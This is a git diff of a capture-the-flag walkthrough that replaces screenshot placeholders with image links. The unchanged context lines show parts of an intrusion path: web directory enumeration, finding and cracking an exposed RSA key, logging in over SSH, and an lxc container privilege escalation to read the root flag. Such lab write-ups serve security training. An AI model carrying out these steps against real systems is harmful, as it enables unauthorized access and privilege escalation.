@@ -27,7 +27,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
 ```
 
-[SCREEN02]
+<img width="893" height="375" alt="SCREEN02" src="https://github.com/user-attachments/assets/44478345-0138-47d7-866c-68d5d1af050f" />
 
 **Key findings:**
 
@@ -39,7 +39,7 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-l
 - Find username `john` mentioned in HTML comments
 - Discover private RSA key at `/secret/secretKey`
 
-[SCREEN01]
+<img width="727" height="45" alt="SCREEN01" src="https://github.com/user-attachments/assets/74405d70-864f-401f-9898-5f5509e5749a" />
 
 4. Crack the RSA key passphrase and establish SSH connection:
 
@@ -52,7 +52,7 @@ ssh -i rsa john@<TARGET_IP>
 cat user.txt
 ```
 
-[SCREEN03]
+<img width="264" height="35" alt="SCREEN03" src="https://github.com/user-attachments/assets/0f966303-b500-4e12-84ae-41332e003c67" />
 
 ---
 
@@ -90,7 +90,7 @@ lxc exec ignite /bin/sh
 whoami
 ```
 
-[SCREEN04]
+<img width="987" height="336" alt="SCREEN04" src="https://github.com/user-attachments/assets/f1f4c1b7-0735-4e22-9860-97620ea39903" />
 
 4. Locate and read the root flag:
 
@@ -99,4 +99,4 @@ find / -name "root.txt"
 cat /mnt/root/root/root.txt
 ```
 
-[SCREEN05]
+<img width="348" height="81" alt="SCREEN05" src="https://github.com/user-attachments/assets/db1cf0e5-7673-45af-9d49-be6e0bb46d39" />
